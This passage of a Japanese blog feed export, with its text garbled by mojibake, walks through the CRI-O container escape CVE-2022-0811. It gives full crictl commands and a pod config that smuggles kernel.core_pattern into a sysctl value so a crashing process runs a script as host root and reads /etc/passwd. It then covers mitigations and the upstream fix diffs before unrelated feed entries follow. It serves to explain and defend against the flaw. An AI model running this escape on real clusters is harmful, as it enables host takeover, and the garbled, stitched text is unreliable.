ã¯å‰è¿°ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¨åŒã˜ã‚‚ã®ã§ã™ã€‚# crictl runp pod-config.json d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a# crictl create d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a container-config.json pod-config.json 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123# crictl start 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac61239029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123èµ·å‹•ã—ãŸã‚³ãƒ³ãƒ†ãƒŠã«ã‚¢ã‚¿ãƒƒãƒã—ã€ã‚³ãƒ³ãƒ†ãƒŠã® root ãƒ‘ã‚¹ã«ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’é…ç½®ã—ã¾ã™ã€‚/etc/passwd ã‚’ã‚³ãƒ³ãƒ†ãƒŠå†…ã® /output ã«å‡ºåŠ›ã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ç”¨æ„ã—ã¾ã—ãŸã€‚# crictl exec -it 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123 bashroot@d33614f0b22d:/# mount | grep overlayoverlay on / type overlay (rw,relatime,lowerdir=/var/lib/containers/storage/overlay/l/73PSGHB33J2RBZXIUVK7SRC4UA,upperdir=/var/lib/containers/storageoverlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff,workdir=/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/work,metacopy=on,volatile)root@d33614f0b22d:/# echo '#!/bin/sh' \u003e /cmdroot@d33614f0b22d:/# echo 'cat /etc/passwd \u003e /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/output' \u003e\u003e cmdroot@d33614f0b22d:/# cat /cmd#!/bin/shcat /etc/passwd \u003e /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/outputroot@d33614f0b22d:/# chmod a+x /cmdç¶šã„ã¦ kernel.core_pattern ã‚’å¤‰æ›´ã™ã‚‹ pod ã‚’ä½œæˆã—ã¾ã™ã€‚+ ã§é€£çµã—ãŸ value ã‚’è¨˜è¼‰ã—ã¾ã™ã€‚value ã«è¨˜è¼‰ã™ã‚‹ kernel.core_pattern ã«ã¯ã€ãƒ›ã‚¹ãƒˆã‹ã‚‰è¦‹ãŸãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®çµ¶å¯¾ãƒ‘ã‚¹ã‚’æŒ‡å®šã—ã¦ã„ã¾ã™ã€‚# ã‚’ã¤ã‘ã¦ã„ã¾ã™ãŒã€ã“ã‚Œã¯ CRI-O ã®å®Ÿè£…ã§ä»˜ä¸ã•ã‚Œã‚‹ã‚·ãƒ³ã‚°ãƒ«ã‚¯ã‚©ãƒ¼ãƒˆã‚’ç„¡åŠ¹åŒ–ã™ã‚‹å½¹å‰²ãŒã‚ã‚Šã¾ã™ã€‚# cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %E# cat pod-config2.json {    \"metadata\": {        \"name\": \"ubuntu-sandbox2\",        \"namespace\": \"default\",        \"attempt\": 1,        \"uid\": \"edishd83djaidwnduwk28bcsd\"    },    \"log_directory\": \"/tmp\",    \"linux\": {  \"sysctls\": {      \"kernel.shm_rmid_forced\": \"1+kernel.core_pattern=|/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\"  }    }}# crictl runp pod-config2.json FATA[0001] run pod sandbox: rpc error: code = Unknown desc = container create failed: write to /proc/sys/kernel/shm_rmid_forced: Invalid argument pod ä½œæˆã¯ã‚¨ãƒ©ãƒ¼ã«ãªã‚Šã¾ã™ãŒã€kernel.core_pattern ã‚’è¦‹ã‚‹ã¨å¤‰æ›´ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚# cat /proc/sys/kernel/core_pattern |/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #'æœ€å¾Œã«èµ·å‹•ä¸­ã®ã‚³ãƒ³ãƒ†ãƒŠå†…ã§ãƒ—ãƒ­ã‚»ã‚¹ã‚’ç•°å¸¸çµ‚äº†ã•ã›ã‚‹ã“ã¨ã§ã€ Coredump ã®æ©Ÿèƒ½ã‚’å‘¼ã³å‡ºã—ãƒ›ã‚¹ãƒˆã® root æ¨©é™ã§ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚root@d33614f0b22d:/# tail -f /dev/null \u0026[1] 17root@d33614f0b22d:/# ps    PID TTY          TIME CMD      4 pts/0    00:00:00 bash     17 pts/0    00:00:00 tail     18 pts/0    00:00:00 psroot@d33614f0b22d:/# kill -SIGSEGV 17root@d33614f0b22d:/# ls /bin  boot  cmd  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  output  proc  root  run  sbin  srv  sys  tmp  usr  var[1]+  Segmentation fault      (core dumped) tail -f /dev/nullroot@d33614f0b22d:/# cat /output root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin...å›é¿ç­–CrowdStrike ç¤¾ã®ãƒ–ãƒ­ã‚° ã‚’å‚è€ƒã«ã—ã¦ã„ã¾ã™ã€‚CRI-O ã®ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆ (éæ¨å¥¨ã ãŒ v1.18 ä»¥ä¸‹ã¸ã®ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã‚‚å¯)OPA ç­‰ã®ãƒãƒªã‚·ãƒ¼ã‚’è¨­å®šã™ã‚‹PSP ã§ sysctls ã‚’å…¨ã¦ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹pinns ã® -s ã‚’é™¤å»ã™ã‚‹ãƒ©ãƒƒãƒ‘ãƒ¼ã‚’ç”¨æ„ã—ã€crio.conf ã® pinns_path ã«è¨­å®šã™ã‚‹ä¿®æ­£ãƒ‘ãƒƒãƒcommit1https://github.com/cri-o/cri-o/commit/05c443b06356c2dbf9d30060f362279c6b8ac1a1pinns ã® -s ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ç®‡æ‰€ã§ã€+ ã«å¯¾ã—ã¦ãƒãƒªãƒ‡ãƒ¼ã‚·ãƒ§ãƒ³ã‚’è¿½åŠ ã—ã¦ã„ã¾ã™ã€‚  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...      if len(cfg.Sysctls) != 0 {-     pinnsArgs = append(pinnsArgs, \"-s\", getSysctlForPinns(cfg.Sysctls))+     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)+     if err != nil {+       return nil, errors.Wrapf(err, \"invalid sysctl\")+     }+     pinnsArgs = append(pinnsArgs, \"-s\", pinnsSysctls)    }      ...  }- func getSysctlForPinns(sysctls map[string]string) string {-   // this assumes there's no sysctl with a `+` in it+ func getSysctlForPinns(sysctls map[string]string) (string, error) {+   // This assumes there's no valid sysctl value with a `+` in it+   // and as such errors if one is found.    const pinnsSysctlDelim = \"+\"    g := new(bytes.Buffer)    for key, value := range sysctls {+     if strings.Contains(key, pinnsSysctlDelim) || strings.Contains(value, pinnsSysctlDelim) {+       return \"\", errors.Errorf(\"'%s=%s' is invalid: %s found yet should not be present\", key, value, pinnsSysctlDelim)+     }      fmt.Fprintf(g, \"'%s=%s'%s\", key, value, pinnsSysctlDelim)    }-   return strings.TrimSuffix(g.String(), pinnsSysctlDelim)+   return strings.TrimSuffix(g.String(), pinnsSysctlDelim), nil  }commit2https://github.com/cri-o/cri-o/commit/1af1f8af2c7e23525102dffbf0899b69e34ed3d2æ–‡å­—åˆ—ã®é€£çµã‚’ã‚„ã‚ã€-s ã‚’ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿æ¯ã«è¨­å®šã™ã‚‹ä¿®æ­£ãŒã•ã‚Œã¦ã„ã¾ã™ã€‚  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...  -   if len(cfg.Sysctls) != 0 {-     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)-     if err != nil {-       return nil, errors.Wrapf(err, \"invalid sysctl\")-     }-     pinnsArgs = append(pinnsArgs, \"-s\", pinnsSysctls)+   for key, value := range cfg.Sysctls {+     pinnsArgs = append(pinnsArgs, \"-s\", fmt.Sprintf(\"%s=%s\", key, value))    }      ...  }containerd ã®å ´åˆä»–ã®ã‚³ãƒ³ãƒ†ãƒŠãƒ©ãƒ³ã‚¿ã‚¤ãƒ ãŒã©ã†ãªã£ã¦ã„ã‚‹ã‹æ°—ã«ãªã£ãŸã®ã§ã€containerd ã®å®Ÿè£…ã‚’èª¿ã¹ã¦ã¿ã¾ã—ãŸã€‚https://github.com/opencontainers/runc/blob/main/libcontainer/configs/validate/validator.go// sysctl validates that the specified sysctl keys are valid or not.// /proc/sys isn't completely namespaced and depending on which namespaces// are specified, a subset of sysctls are permitted.func (v *ConfigValidator) sysctl(config *configs.Config) error {    validSysctlMap := map[string]bool{        \"kernel.msgmax\":          true,        \"kernel.msgmnb\":          true,        \"kernel.msgmni\":          true,        \"kernel.sem\":             true,        \"kernel.shmall\":          true,        \"kernel.shmmax\":          true,        \"kernel.shmmni\":          true,        \"kernel.shm_rmid_forced\": true,    }    for s := range config.Sysctl {        if validSysctlMap[s] || strings.HasPrefix(s, \"fs.mqueue.\") {            if config.Namespaces.Contains(configs.NEWIPC) {                continue            } else {                return fmt.Errorf(\"sysctl %q is not allowed in the hosts ipc namespace\", s)            }        }        if strings.HasPrefix(s, \"net.\") {            if config.Namespaces.Contains(configs.NEWNET) {                continue            } else {                return fmt.Errorf(\"sysctl %q is not allowed in the hosts network namespace\", s)            }        }        return fmt.Errorf(\"sysctl %q is not in a separate kernel namespace\", s)    }    return nil}CRI-O ã¯ pinns ã«ã‚ˆã‚Šç‹¬è‡ªã® sysctls è¨­å®šã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ãŒã€pod ä½œæˆæ™‚ã«è¨­å®šã™ã‚‹éƒ½åˆä¸Šã€ OCI ã®æ©Ÿèƒ½ã‚’ä½¿ã‚ãªã„æ–¹æ³•ã‚’é¸ã‚“ã ã®ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ (æ ¹æ‹ ã¯ãªã„ã§ã™)ã€‚ã•ã„ã”ã«åˆã‚ã¦ CRI-O ã‚’è§¦ã‚Šã¾ã—ãŸãŒã€Docker ã‚„ containerd ã¨ã¯ã‹ãªã‚Šä»•çµ„ã¿ãŒç•°ãªã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚è„†å¼±æ€§ã®èª¿æŸ»ã‚’é€šã—ã¦ CRI-O ã®å®Ÿè£…ã‚„ Linux ã®æ©Ÿèƒ½ã«è§¦ã‚Œã‚‹ã“ã¨ãŒã§ãã€è‰¯ã„æ©Ÿä¼šã‚’å¾—ã‚‰ã‚ŒãŸã¨æ€ã„ã¾ã™ã€‚å†…å®¹ã«èª¤ã‚ŠãŒå«ã¾ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã®ã§ã€ä½•ã‹ãŠæ°—ã¥ãã®æ–¹ã¯ã”æŒ‡æ‘˜ç­‰ã‚ˆã‚ã—ããŠé¡˜ã„ã—ã¾ã™ã€‚å‚è€ƒãƒªãƒ³ã‚¯https://nvd.nist.gov/vuln/detail/CVE-2022-0811https://blog.aquasec.com/cve-2022-0811-cri-o-vulnerabilityhttps://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7https://pwning.systems/posts/escaping-containers-for-fun/https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mountshttps://valinux.hatenablog.com/entry/20210721https://qiita.com/rarul/items/d33b664c8414f065e65ehttps://man7.org/linux/man-pages/man5/core.5.htmlhttps://lwn.net/Articles/280959/https://wiki.ubuntu.com/Apport","isoDate":"2022-03-28T09:22:43.000Z","dateMiliSeconds":1648459363000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"è„†å¼±æ€§ã«å­¦ã¶ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£","link":"https://speakerdeck.com/kyohmizu/cui-ruo-xing-nixue-bukontenasekiyuritei","contentSnippet":"3-shake SRE Tech Talk #3 ã®ç™»å£‡è³‡æ–™ã§ã™ã€‚\rhttps://3-shake.connpass.com/event/241284/","isoDate":"2022-03-18T04:00:00.000Z","dateMiliSeconds":1647576000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"macOS ã«ãŠã‘ã‚‹ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å–ã‚Šçµ„ã¿","link":"https://speakerdeck.com/kyohmizu/macos-niokeruendopointosekiyuriteifalsequ-rizu-mi","contentSnippet":"Infra Study 2nd #5ã€Œä½ãƒ¬ã‚¤ãƒ¤ãƒ¼ã®ä¸–ç•Œã¸ã®èª˜ã„ã€ã®LTç™»å£‡è³‡æ–™ã§ã™ã€‚\rhttps://forkwell.connpass.com/event/222932/","isoDate":"2021-09-28T04:00:00.000Z","dateMiliSeconds":1632801600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"VolumePluginã®ä»•çµ„ã¿ã¨å®Ÿè£…è§£èª¬","link":"https://speakerdeck.com/kyohmizu/volumepluginfalseshi-zu-mitoshi-zhuang-jie-shuo","contentSnippet":"å‹‰å¼·ä¼šã®è³‡æ–™ã§ã™ã€‚\rhttps://k8sinternal.connpass.com/event/203946/","isoDate":"2021-02-22T05:00:00.000Z","dateMiliSeconds":1613970000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"VolumePlugin ãŒãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’ä½œæˆãƒ»ãƒã‚¦ãƒ³ãƒˆã™ã‚‹ã—ãã¿","link":"https://qiita.com/kyohmizu/items/40bee7037e1ce7949772","contentSnippet":"ã¯ã˜ã‚ã«Pod ã®ä½œæˆæ™‚ã€pod.spec.volumes ã«è¨˜è¿°ã—ãŸãƒœãƒªãƒ¥ãƒ¼ãƒ ãŒã‚³ãƒ³ãƒ†ãƒŠã«ãƒã‚¦ãƒ³ãƒˆã•ã‚Œã¾ã™ã€‚ãƒã‚¦ãƒ³ãƒˆã•ã‚Œã‚‹ Node å´ã®ãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’ã€VolumePlugin ãŒã©ã®ã‚ˆã†ã«ä½œæˆãƒ»ãƒã‚¦ãƒ³ãƒˆã—ã¦ã„ã‚‹ã®ã‹èª¿ã¹ã¾ã—ãŸã€‚æ©Ÿèƒ½VolumePlugin ã¯...","isoDate":"2020-12-17T10:54:47.000Z","dateMiliSeconds":1608202487000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"æƒ…å ±å‡¦ç†å®‰å…¨ç¢ºä¿æ”¯æ´å£«ã®é–¢é€£è³‡æ–™","link":"https://kyohmizu.hatenablog.com/entry/2020/08/05/115459","contentSnippet":"æƒ…å ±å‡¦ç†å®‰å…¨ç¢ºä¿æ”¯æ´å£«ã®æ¥­å‹™ã‚’è¡Œã†ä¸Šã§ã€å‚ç…§ã™ã¹ãè³‡æ–™ä¸€è¦§ã§ã™ã€‚ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åŸºæœ¬æ³•ï¼ˆå¹³æˆäºŒåå…­å¹´æ³•å¾‹ç¬¬ç™¾å››å·ï¼‰æƒ…å ±å‡¦ç†ã®ä¿ƒé€²ã«é–¢ã™ã‚‹æ³•å¾‹ï¼ˆæ˜­å’Œå››åäº”å¹´æ³•å¾‹ç¬¬ä¹åå·ï¼‰æƒ…å ±å‡¦ç†å­¦ä¼šå€«ç†ç¶±é ˜RFC:1087 å€«ç†ã¨ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆ(Ethics and the Internet)ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾å¿œçµ„ç¹” (SOC,CSIRT)å¼·åŒ–ã«å‘ã‘ãŸã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æƒ…å ±å…±æœ‰ã®ã€Œ5W1Hã€ v2.0 (2019å¹´4æœˆ)JPCERT ã‚¤ãƒ³ã‚·ãƒ‡ãƒ³ãƒˆãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ãƒãƒ‹ãƒ¥ã‚¢ãƒ«IPA è„†å¼±æ€§å¯¾ç­–ã®åŠ¹æœçš„ãªé€²ã‚æ–¹ï¼ˆãƒ„ãƒ¼ãƒ«æ´»ç”¨ç·¨ï¼‰æƒ…å ±ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ—©æœŸè­¦æˆ’ãƒ‘ãƒ¼ãƒˆãƒŠãƒ¼ã‚·ãƒƒãƒ—ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³IPA é‡è¦ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æƒ…å ±ä¸€è¦§IPA å…±é€šè„†å¼±æ€§è©•ä¾¡ã‚·ã‚¹ãƒ†ãƒ CVSS v3æ¦‚èª¬JVN (Japan Vulnerability Notes)JVN è„†å¼±æ€§ãƒ¬ãƒãƒ¼ãƒˆã®èª­ã¿æ–¹JVN iPediaFIRST Common Vulnerability Scoring System SIGCWE (Common Weakness Enumeration)IPA è„†å¼±æ€§ä½“é¨“å­¦ç¿’ãƒ„ãƒ¼ãƒ« AppGoatMyJVNIPA çµ„ç¹”ã«ãŠã‘ã‚‹å†…éƒ¨ä¸æ­£é˜²æ­¢ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³åœ°æ–¹å…¬å…±å›£ä½“ã«ãŠã‘ã‚‹æƒ…å ±ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã«é–¢ã™ã‚‹ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³(å¹³æˆ30å¹´9æœˆç‰ˆ)IPA å§”è¨—é–¢ä¿‚ã«ãŠã‘ã‚‹æƒ…å ±ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³IPA ä¸­å°ä¼æ¥­ã®æƒ…å ±ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³IPA æƒ…å ±æ¼ãˆã„å¯¾ç­–ã®ã—ãŠã‚ŠNISC ã‚¹ãƒãƒ¼ãƒˆãƒ•ã‚©ãƒ³ç­‰ã®æ¥­å‹™åˆ©ç”¨ã«ãŠã‘ã‚‹æƒ…å ±ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã®å®Ÿæ–½æ‰‹é †ä½œæˆæ‰‹å¼•æ›¸å€‹äººæƒ…å ±ã®ä¿è­·ã«é–¢ã™ã‚‹æ³•å¾‹ã«ã¤ã„ã¦ã®ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³IPA ä¼æ¥­(çµ„ç¹”)ã«ãŠã‘ã‚‹æœ€ä½é™ã®æƒ…å ±ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã®ã—ãŠã‚Šã‚¹ãƒãƒ¼ãƒˆãƒ•ã‚©ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ï¼œå±é™ºå›é¿ï¼å¯¾ç­–ã®ã—ãŠã‚ŠJPCERT/CC æŠ€è¡“ãƒ¡ãƒ¢ - å®‰å…¨ãª Web ãƒ–ãƒ©ã‚¦ã‚¶ã®ä½¿ã„æ–¹IPA ã‚¦ã‚§ãƒ–ãƒ–ãƒ©ã‚¦ã‚¶ã®ãƒ—ãƒ­ãƒ†ã‚¯ã‚·ãƒ§ãƒ³ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«","isoDate":"2020-08-05T02:54:59.000Z","dateMiliSeconds":1596596099000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"2019å¹´ã®ãµã‚Šã‹ãˆã‚Šã€2020å¹´ã®ç›®æ¨™","link":"https://kyohmizu.hatenablog.com/entry/2020/02/01/040351","contentSnippet":"ã™ã§ã«å¹´ãŒæ˜ã‘ã¦1ãƒ¶æœˆçµŒã¡ã¾ã—ãŸãŒã€2019å¹´ã®æ´»å‹•ã‚’æŒ¯ã‚Šè¿”ã‚ã†ã¨æ€ã„ã¾ã™ã€‚Kubernetesã€Cloud NativeæŠ€è¡“ã‚’ä¸­å¿ƒã«å­¦ç¿’ã‚’é€²ã‚ã¾ã—ãŸã€‚å‹‰å¼·ä¼šã€ã‚«ãƒ³ãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹1æœˆCloud Native Meetup Tokyo #6 KubeCon + CNCon RecapKubernetes Meetup Tokyo #15 - KubeCon 2018 RecapRancher/Kuberneteså‹‰å¼·ä¼šã€€Kubernetesç®¡ç†ãƒ„ãƒ¼ãƒ«ã®æ´»ç”¨æ³•OWASP Connect in Tokyo #2ä»Šå›ã¯ç‰¹åˆ¥ç·¨ï¼Cloud Nativeãªã‚¢ãƒ—ãƒªé–‹ç™ºã‹ã‚‰å­¦ã‚“ã ã“ã¨ã‚’å…¨éƒ¨ã‚·ã‚§ã‚¢ - cndjp#92æœˆYahoo! JAPAN MEETUP #31 ã‚¤ãƒ³ãƒ•ãƒ©æŠ€è¡“ã‚«ãƒ³ãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹Go 1.12 Release Party in Tokyo w/ Fukuoka\u0026Umedassmjp 2019/02Docker Meetup Tokyo #28ç¬¬ä¸‰å›ãƒœãƒˆãƒ ã‚¢ãƒƒãƒ—ãƒ‰ãƒ¡ã‚¤ãƒ³é§†å‹•è¨­è¨ˆã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚·ãƒ³ãƒã‚¸ã‚¦ãƒ 3æœˆk8s source code reading #3Cloud Native Meetup Tokyo #7 @Abema Towers4æœˆCloud Native Tokyo #01Serverlessã«ã¤ã„ã¦æ€ã„ã‚’é¦³ã›ã‚‹ä¸€å¤œ - cndjpç¬¬11å›å‹‰å¼·ä¼šssmjp 2019/04Rancher k3s ã‚‚ãã‚‚ãå‹‰å¼·ä¼š #035æœˆãƒ¬ã‚¬ã‚·ãƒ¼ã‚’ã¶ã£ã¤ã¶ã›ã€‚ç¾å ´ã§DDDï¼ssmjp 2019/05IIJ Technical NIGHT vol.7SRE Lounge #9Docker Meetup Tokyo #30 (DockerConãƒ»KubeConEUå ±å‘Šä¼š)Yahoo! JAPAN MEETUP #32 ã‚¤ãƒ³ãƒ•ãƒ©æŠ€è¡“ï¼Kubernetes6æœˆNoOps Meetup Tokyo #6Kubernetes Meetup Tokyo #20 - KubeCon RecapGCPUG Tokyo Next Extended 2019 Infra DayInteract 20197æœˆæã‚‹ã‚‹ã“ã¨ãªã‹ã‚Œ! Cloud Nativeãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒŠãƒ«DBç‰¹é›†!! - cndjpç¬¬12å›ç¬¬ä¸‰åäº”å› Azureã‚‚ãã‚‚ãä¼š @ å“å·CloudNative Days Tokyo Meetup w/ Melanie CebulaKubernetes Meetup Tokyo #21 - Cloud Native CI/CDSekkeiKaigiCloud Native Days Tokyo 2019 â†’ ã‚¹ã‚¿ãƒƒãƒ•ã¨ã—ã¦å‚åŠ 8æœˆSRE Lounge #10CloudNative Days Tokyo 2019æŒ¯ã‚Šè¿”ã‚ŠNightGo 1.13 Release Party in TokyoKubernetes Meetup Tokyo #229æœˆDocker Meetup Tokyo #32Japan Azure User Group 9å‘¨å¹´ã‚¤ãƒ™ãƒ³ãƒˆXPç¥­ã‚Š2019golang.tokyo #26Cloud Native Meetup Tokyo #10Kubernetes Meetup Tokyo #23 - Operator Deep Dive10æœˆTerraform meetup tokyo#2Kubernetes Meetup Tokyo #24SRE Lounge #1111æœˆã•ãã‚‰ã®å¤•ã¹Docker/KubernetesãƒŠã‚¤ãƒˆ #2Go Release 10 Year Anniversary Party in Tokyoã‚´ãƒªãƒ©.vim #10 éå…¬å¼VimConfå¾Œå¤œç¥­ girls.vimã¨åˆåŒé–‹å‚¬æŠ€è¡“æ›¸å…¸8 ã¯ã˜ã‚ã¦ã®ã‚µãƒ¼ã‚¯ãƒ«å‚åŠ meetupMicrosoft Open Tech Night #1 - ã‚¤ãƒ³ãƒ•ãƒ©ç·¨+Igniteé€Ÿå ±ä¿ºãŸã¡ã®æœ€é©ãªCloud Nativeã‚’æ±‚ã‚ã¦â€¦ã€‚æœ¬æ°—ã®ã“ã¨å§‹ã‚ï¼ - cndjpç¬¬13å›12æœˆJapan Rook Meetup #1Cloud Native Meetup Tokyo #11 KubeCon RecapGDG DevFest Tokyo 2019Microsoft Open Tech Night #3 - ã‚¯ãƒ©ã‚¦ãƒ‰ãƒã‚¤ãƒ†ã‚£ãƒ–ç·¨ç™»å£‡è³‡æ–™speakerdeck.comspeakerdeck.comspeakerdeck.comæ›¸ç±å•†æ¥­èªŒKuberneteså®Œå…¨ã‚¬ã‚¤ãƒ‰ã—ãã¿ãŒã‚ã‹ã‚‹Kubernetesã¿ã‚“ãªã®Docker/KubernetesKuberneteså®Ÿè·µå…¥é–€æƒ…å ±å‡¦ç†å®‰å…¨ç¢ºä¿æ”¯æ´å£« æ•™ç§‘æ›¸ã¿ã‚“ãªã®Goè¨€èªã‚¤ãƒ³ãƒ•ãƒ©ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ã®æ•™ç§‘æ›¸Linuxã®ã—ãã¿åˆ†æ•£ã‚·ã‚¹ãƒ†ãƒ ãƒ‡ã‚¶ã‚¤ãƒ³ãƒ‘ã‚¿ãƒ¼ãƒ³å…¥é–€ç›£è¦–Linuxæ•™ç§‘æ›¸ LPICãƒ¬ãƒ™ãƒ«1Dockerå®Ÿè·µã‚¬ã‚¤ãƒ‰Kuberneteså®Ÿè·µã‚¬ã‚¤ãƒ‰åŒäººèªŒãµã‚Šã‹ãˆã‚Šèª­æœ¬ å ´ä½œã‚Šç·¨ãµã‚Šã‹ãˆã‚Šèª­æœ¬ å­¦ã³ç·¨ãµã‚Šã‹ãˆã‚Šèª­æœ¬ å®Ÿè·µç·¨ç†è«–ã¨äº‹ä¾‹ã§ã‚ã‹ã‚‹è‡ªå·±è‚¯å®šæ„Ÿç†è«–ã¨äº‹ä¾‹ã§ã‚ã‹ã‚‹ãƒ¢ãƒãƒ™ãƒ¼ã‚·ãƒ§ãƒ³ç¾å ´ã®ã€Œã‚ºãƒ¬ã€ã‚’è§£æ¶ˆã™ã‚‹ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ¡ã‚½ãƒƒãƒ‰ ç¬¬2ç‰ˆä¼šè©±ã®å¼•ãå‡ºã—ã‚’å¢—ã‚„ã™ 1on1ã‚«ãƒ¼ãƒ‰ ã¨ ä½¿ã„ã“ãªã—ãƒ–ãƒƒã‚¯Prometheusã§Kubernetesã‚’ç›£è¦–ã™ã‚‹æœ¬Kubernetes-Native Development \u0026 Deploymentå®Ÿè·µå…¥é–€ Kubernetes ã‚«ã‚¹ã‚¿ãƒ ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã¸ã®é“Knativeã®æ­©ãæ–¹è³‡æ ¼æƒ…å ±å‡¦ç†å®‰å…¨ç¢ºä¿æ”¯æ´å£«LPIC 101ã€102ãƒ„ãƒ¼ãƒ«ãƒ»æŠ€è¡“DockerKubernetesHelmPrometheusGrafanaLokiArgo CDConcourseTerraformTelepresencecert-managerWindowsã‚³ãƒ³ãƒ†ãƒŠMicrosoft AzureGoè¨€èªVue.jsç¤¾å†…ã§ã®æ´»å‹•å®šæœŸå‹‰å¼·ä¼šã‚’ä¸»å‚¬ãµã‚Šã‹ãˆã‚Šã‚’å®Ÿæ–½ã€ãƒ•ã‚¡ã‚·ãƒªãƒ†ãƒ¼ã‚¿ãƒ¼å½¹Dockerãƒ¯ãƒ¼ã‚¯ã‚·ãƒ§ãƒƒãƒ—ã‚’é–‹å‚¬2020å¹´ã®ç›®æ¨™2020å¹´ã‚‚Cloud 